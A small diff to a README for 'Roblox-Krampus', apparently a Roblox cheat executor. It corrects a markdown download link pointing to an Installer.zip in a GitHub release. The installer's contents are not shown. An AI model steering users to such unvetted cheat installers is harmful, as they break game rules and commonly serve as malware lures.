@@ -1,4 +1,4 @@
-# [DOWNLOAD Roblox-Krampus ]((https://github.com/freedeer883/Roblox-Krampus/releases/download/download/Installer.zip)
+# [DOWNLOAD Roblox-Krampus](https://github.com/freedeer883/Roblox-Krampus/releases/download/download/Installer.zip)
 # Roblox-Krampus
 
 ![Roblox Krampus Executor Logo](https://example.com/logo.png)
